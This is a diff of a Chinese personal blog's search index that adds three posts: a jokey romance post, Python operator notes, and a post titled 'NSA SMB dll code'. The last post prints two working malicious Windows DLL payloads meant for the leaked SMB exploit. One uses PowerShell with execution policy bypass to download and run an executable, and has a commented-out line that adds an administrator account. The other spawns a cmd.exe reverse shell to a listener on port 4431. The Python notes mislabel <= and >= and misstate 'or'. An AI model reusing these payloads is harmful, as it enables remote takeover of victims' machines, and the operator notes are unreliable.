@@ -4,6 +4,60 @@
   
     
     <entry>
+      <title><![CDATA[祝天下有情人终成兄妹]]></title>
+      <url>http://phpplay.github.io/2017/05/20/%E6%84%BF%E5%A4%A9%E4%B8%8B%E6%9C%89%E6%83%85%E4%BA%BA%E7%BB%88%E6%88%90%E5%85%84%E5%A6%B9/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>先来一个我喜欢的up主的视频，看得我都想谈恋爱了</p>
+<embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=10672935&page=1" pluginspage="//www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash">
+
+<p>再来个虐狗的 - -   ， 有没有人被暴击到？</p>
+<embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=8709991&page=1" pluginspage="//www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash">
+
+<p>最后祝天下有情人，终成兄妹</p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> 生活 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[python运算符笔记]]></title>
+      <url>http://phpplay.github.io/2017/05/12/python%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">+</div><div class="line">加</div><div class="line">7+8    &apos;7&apos;+&apos;8&apos;</div><div class="line"></div><div class="line">-</div><div class="line">减  取相反数  9-7    -(-7)</div><div class="line"></div><div class="line">*</div><div class="line">乘   字符若干次   9*9  &apos;9&apos;*9</div><div class="line"></div><div class="line"></div><div class="line">/</div><div class="line">除</div><div class="line"></div><div class="line"></div><div class="line">**</div><div class="line">幂运算</div><div class="line">2**3 </div><div class="line"></div><div class="line">&lt;</div><div class="line">小于 返回bool值 9&lt;1</div><div class="line"></div><div class="line">&gt;</div><div class="line">大于  返回bool值  9&gt;1</div><div class="line"></div><div class="line"></div><div class="line">!=</div><div class="line">不等于  返回bool值  9!=1</div><div class="line"></div><div class="line"></div><div class="line">//</div><div class="line">除法  求商整数    9//5</div><div class="line"></div><div class="line">%</div><div class="line">取余   9%5</div><div class="line"></div><div class="line"></div><div class="line">&amp;</div><div class="line">按位与   7&amp;8 =0   7&amp;9  =1    000000111 000010000  得到  00000000   00000111  00001001   得到  00000001     二进制的每一位都进行and</div><div class="line"></div><div class="line">|</div><div class="line">按位或   7|8  =15  00000111   00001000   00001111    二进制的每一位都进行or</div><div class="line"></div><div class="line">^</div><div class="line">按位异或   每位不相同为1 相同为0  7^8  =15   00000111  000010000    00001111</div><div class="line"></div><div class="line"></div><div class="line">~</div><div class="line">翻转   ~x =- (x+1)    ~8  = -9</div><div class="line"></div><div class="line"></div><div class="line">&gt;&gt;</div><div class="line">右移    8 &gt;&gt;1    00001000  00000100   向右移动一位   除以2的n次幂</div><div class="line"></div><div class="line"></div><div class="line">&lt;&lt;</div><div class="line">左移    8 &lt;&lt;1    00001000   00010000   向左移动一位  乘以2的n次幂</div><div class="line"></div><div class="line">&lt;=</div><div class="line">大于   8&lt;=1   True</div><div class="line"></div><div class="line">&gt;=</div><div class="line">小于   9&gt;=1   False</div><div class="line"></div><div class="line">==</div><div class="line">相等    9 ==1  False</div><div class="line"></div><div class="line"></div><div class="line">not   not True   =  False</div><div class="line"></div><div class="line">and    True   and False  = False     </div><div class="line"></div><div class="line">or     True   and False  = True</div></pre></td></tr></table></figure>]]></content>
+      
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[NSA SMB  dll code]]></title>
+      <url>http://phpplay.github.io/2017/04/20/NSA-SMB/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="这两天最火的是啥？方程式！"><a href="#这两天最火的是啥？方程式！" class="headerlink" title="这两天最火的是啥？方程式！"></a>这两天最火的是啥？方程式！</h2><pre><code>dll 源码
+转眼就是是5.20了，回头才发现一个月没写博客了，好浪费啊，没办法，最近太忙了
+记录一下自己用的dll源码吧
+</code></pre><p>其实也是网上抄的。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</div><div class="line">#include &quot;stdafx.h&quot;</div><div class="line">#include &lt;windows.h&gt;</div><div class="line"></div><div class="line">void Fuck(void);</div><div class="line"></div><div class="line">BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)</div><div class="line">&#123;</div><div class="line">	switch (dwReason)</div><div class="line">	&#123;</div><div class="line">	case DLL_PROCESS_ATTACH:</div><div class="line">		Fuck();</div><div class="line">		break;</div><div class="line"></div><div class="line">	case DLL_PROCESS_DETACH:</div><div class="line"></div><div class="line">		break;</div><div class="line"></div><div class="line">	case DLL_THREAD_ATTACH:</div><div class="line"></div><div class="line">		break;</div><div class="line"></div><div class="line">	case DLL_THREAD_DETACH:</div><div class="line"></div><div class="line">		break;</div><div class="line">	&#125;</div><div class="line">	return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Fuck(void) </div><div class="line">&#123;</div><div class="line">	</div><div class="line">	WinExec(&quot;cmd.exe /c powershell.exe   -exec bypass  -Command (New-Object Net.WebClient).DownloadFile(&apos;http://127.0.0.1/1.exe&apos;,&apos;C:\\Windows\\Temp\\temp.exe&apos;);C:\\Windows\\Temp\\temp.exe&quot;, SW_NORMAL);</div><div class="line">	//WinExec(&quot;net localgroup administrators   admin /add&quot;, SW_NORMAL);</div><div class="line">	//WinExec(&quot;cmd.exe /c dir &gt; c://result.txt&quot;, SW_NORMAL); </div><div class="line">	//WinExec(&quot;Cmd.exe /C md c://12&quot;, SW_HIDE);</div><div class="line">	</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</div><div class="line">#include &quot;stdafx.h&quot;</div><div class="line">#include &lt;winsock2.h&gt;  </div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">#pragma comment(lib,&quot;ws2_32&quot;)</div><div class="line">void reverse_shell();</div><div class="line">WSADATA wsaData;</div><div class="line">SOCKET Winsock;</div><div class="line">SOCKET Sock;</div><div class="line">struct sockaddr_in hax;</div><div class="line"></div><div class="line">STARTUPINFO ini_processo;</div><div class="line">PROCESS_INFORMATION processo_info;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)</div><div class="line">&#123;</div><div class="line"></div><div class="line"></div><div class="line">	switch (dwReason)</div><div class="line">	&#123;</div><div class="line">	case DLL_PROCESS_ATTACH:</div><div class="line">		reverse_shell();</div><div class="line">		break;</div><div class="line"></div><div class="line">	case DLL_PROCESS_DETACH:</div><div class="line"></div><div class="line">		break;</div><div class="line"></div><div class="line">	case DLL_THREAD_ATTACH:</div><div class="line"></div><div class="line">		break;</div><div class="line"></div><div class="line">	case DLL_THREAD_DETACH:</div><div class="line"></div><div class="line">		break;</div><div class="line">	&#125;</div><div class="line">	return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">void reverse_shell()</div><div class="line">&#123;</div><div class="line">	LPCSTR szMyUniqueNamedEvent = &quot;sysnullevt&quot;;</div><div class="line">	HANDLE m_hEvent = CreateEventA(NULL, TRUE, FALSE, szMyUniqueNamedEvent);</div><div class="line"></div><div class="line">	switch (GetLastError())</div><div class="line">	&#123;</div><div class="line">		// app is already running</div><div class="line">	case ERROR_ALREADY_EXISTS:</div><div class="line">	&#123;</div><div class="line">								 CloseHandle(m_hEvent);</div><div class="line">								 break;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	case ERROR_SUCCESS:</div><div class="line">	&#123;</div><div class="line"></div><div class="line">						  break;</div><div class="line">	&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line">	WSAStartup(MAKEWORD(2, 2), &amp;wsaData);</div><div class="line">	Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);</div><div class="line"></div><div class="line">	hax.sin_family = AF_INET;</div><div class="line">	//nc -lvvp 4431   本机nc监听</div><div class="line"></div><div class="line">	// 端口</div><div class="line">	hax.sin_port = htons(atoi(&quot;4431&quot;));</div><div class="line"></div><div class="line"></div><div class="line">	//反弹ip</div><div class="line">	hax.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);</div><div class="line">	WSAConnect(Winsock, (SOCKADDR*)&amp;hax, sizeof(hax), NULL, NULL, NULL, NULL);</div><div class="line"></div><div class="line">	memset(&amp;ini_processo, 0, sizeof(ini_processo));</div><div class="line">	ini_processo.cb = sizeof(ini_processo);</div><div class="line">	ini_processo.dwFlags = STARTF_USESTDHANDLES;</div><div class="line">	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</div><div class="line"></div><div class="line">	CreateProcessA(NULL, &quot;cmd.exe&quot;, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&amp;ini_processo, &amp;processo_info);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
+      
+        
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[nmap实用命令]]></title>
       <url>http://phpplay.github.io/2017/04/13/nmap%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
       <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="nmap实用命令"><a href="#nmap实用命令" class="headerlink" title="nmap实用命令"></a>nmap实用命令</h2><p>自己总结了几条nmap的实用命令，主要是用来格式化输出，感觉不错，所以记录一下<br>几个参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-sS  隐蔽扫描(半开syn)</div><div class="line">-sN  不管是否存在直接扫描</div><div class="line">-sI 完全隐藏。以一个跳板主机&#123;无流量&#125;扫描另一台主机</div></pre></td></tr></table></figure></p>
@@ -122,9 +176,9 @@
         
         <tags>
             
-            <tag> python </tag>
-            
             <tag> 网络安全 </tag>
+            
+            <tag> python </tag>
             
         </tags>
         
@@ -218,9 +272,9 @@
         
         <tags>
             
-            <tag> python </tag>
-            
             <tag> 网络安全 </tag>
+            
+            <tag> python </tag>
             
         </tags>
         
@@ -254,9 +308,9 @@
         
         <tags>
             
-            <tag> python </tag>
-            
             <tag> 网络安全 </tag>
+            
+            <tag> python </tag>
             
         </tags>
         
@@ -273,9 +327,9 @@
         
         <tags>
             
-            <tag> python </tag>
-            
             <tag> 网络安全 </tag>
+            
+            <tag> python </tag>
             
         </tags>
         
